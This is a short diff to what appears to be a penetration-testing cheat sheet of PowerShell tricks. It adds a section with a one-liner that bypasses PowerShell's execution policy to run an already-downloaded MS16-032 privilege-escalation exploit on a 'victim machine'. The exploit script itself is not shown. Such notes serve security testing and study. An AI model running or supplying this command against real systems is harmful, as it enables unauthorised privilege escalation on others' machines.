@@ -2,6 +2,14 @@
 
 Here I will describe many common tricks for Powershell:
 
+## Execute Exploit oneliner
+
+If you already downloaded the powershell scrip to your victim machine, execute as following:
+
+```
+C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+```
+
 ## Non Interactive PowerShell execution
 
 ```
